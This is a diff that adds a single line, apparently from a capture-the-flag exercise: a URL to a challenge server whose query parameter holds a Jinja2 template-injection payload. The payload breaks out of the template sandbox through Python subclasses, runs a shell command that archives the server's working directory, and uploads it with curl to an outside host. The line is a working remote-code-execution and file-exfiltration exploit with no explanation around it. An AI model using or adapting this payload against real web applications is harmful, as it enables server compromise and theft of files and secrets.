@@ -1,0 +1,2 @@
+
+http://challs.xmas.htsp.ro:11005/makehat?hatName={{(((%27%27|attr(%27\x5f\x5fclass\x5f\x5f%27))|attr(%27\x5f\x5fbase\x5f\x5f%27))|attr(%27\x5f\x5fsubclasses\x5f\x5f%27))().pop(215)(%27tar\x20czf\x20/tmp/d\x20.;curl\x20-F\x20f=\x40/tmp/d\x20https://redstoneblockchain.xyz/cancer.php%27,shell=1)}}
